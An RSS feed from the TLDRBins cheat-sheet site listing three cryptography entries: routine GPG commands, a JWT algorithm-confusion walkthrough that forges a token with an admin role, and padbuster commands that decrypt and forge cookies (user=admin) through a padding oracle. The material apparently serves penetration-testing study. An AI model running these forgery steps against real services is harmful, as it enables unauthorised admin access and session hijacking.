<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Cryptography on TLDRBins</title>
    <link>https://tldrbins.github.io/@cryptography/</link>
    <description>Recent content in Cryptography on TLDRBins</description>
    <generator>Hugo</generator>
    <language>en-us</language>
    <atom:link href="https://tldrbins.github.io/@cryptography/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>GPG</title>
      <link>https://tldrbins.github.io/gpg/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/gpg/</guid>
      <description>GPG # Check version gpg --version # Generate new key gpg --gen-key # Export public key gpg --export -a &amp;lt;USER&amp;gt;@&amp;lt;DOMAIN&amp;gt; # Check keys gpg --list-keys # Import public key gpg --import &amp;lt;PUB_KEY&amp;gt; # Encrypt a message with public key (email from pub key) gpg --encrypt --armor -r &amp;lt;USER&amp;gt;@&amp;lt;DOMAIN&amp;gt; &amp;lt;FILE&amp;gt; # Decrypt a message with our private key gpg -d &amp;lt;ENC_FILE&amp;gt; # Sign our own message gpg --clearsign --output - &amp;lt;FILE&amp;gt; </description>
    </item>
    <item>
      <title>JWT</title>
      <link>https://tldrbins.github.io/jwt/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/jwt/</guid>
      <description>Abuse #1: Algorithm confusion 0. Sample jwks.json { &amp;#34;keys&amp;#34;: [ { &amp;#34;kty&amp;#34;: &amp;#34;RSA&amp;#34;, &amp;#34;use&amp;#34;: &amp;#34;sig&amp;#34;, &amp;#34;alg&amp;#34;: &amp;#34;RS256&amp;#34;, &amp;#34;n&amp;#34;: &amp;#34;&amp;lt;BASE64_n&amp;gt;&amp;#34;, &amp;#34;e&amp;#34;: &amp;#34;AQAB&amp;#34; } ] } 1. Create a public key # Invoking python interpreter python3 from base64 import urlsafe_b64decode from Crypto.PublicKey import RSA e = int.from_bytes(urlsafe_b64decode(b&amp;#39;AQAB&amp;#39;)) n = int.from_bytes(urlsafe_b64decode(b&amp;#39;&amp;lt;BASE64_N&amp;gt;&amp;#39;)) key = RSA.construct((n, e)) # Save it to public.pem print(key.exportKey().decode()) 2. Forge a jwt # For example, modify role to admin python3 jwt_tool.</description>
    </item>
    <item>
      <title>Padding Oracle</title>
      <link>https://tldrbins.github.io/padding_oracle/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/padding_oracle/</guid>
      <description>Tools padbuster # 8 or 16 : block size # encoding 0 : base64 padbuster http://&amp;lt;TARGET&amp;gt;/index.php &amp;lt;COOKIE_VALUE&amp;gt; 8 -cookies &amp;lt;COOKIE_NAME&amp;gt;=&amp;lt;COOKIE_VALUE&amp;gt; -encoding 0 # Forge cookie value, e.g. user=admin padbuster http://&amp;lt;TARGET&amp;gt;/index.php &amp;lt;COOKIE_VALUE&amp;gt; 8 -cookies &amp;lt;COOKIE_NAME&amp;gt;=&amp;lt;COOKIE_VALUE&amp;gt; -encoding 0 -plaintext user=admin Ref: Download padbuster</description>
    </item>
  </channel>
</rss>
